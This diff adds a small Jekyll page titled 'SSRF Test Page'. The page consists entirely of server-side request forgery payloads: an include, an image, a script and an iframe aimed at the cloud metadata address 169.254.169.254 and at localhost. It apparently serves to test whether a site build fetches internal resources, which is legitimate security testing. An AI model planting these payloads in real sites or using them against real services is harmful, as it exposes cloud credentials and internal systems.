@@ -1,0 +1,11 @@
+---
+layout: default
+---
+
+# SSRF Test Page
+
+{% include http://169.254.169.254/latest/meta-data/ %}
+
+<img src="http://169.254.169.254/latest/meta-data/">
+<script src="http://169.254.169.254/"></script>
+<iframe src="http://localhost/"></iframe>
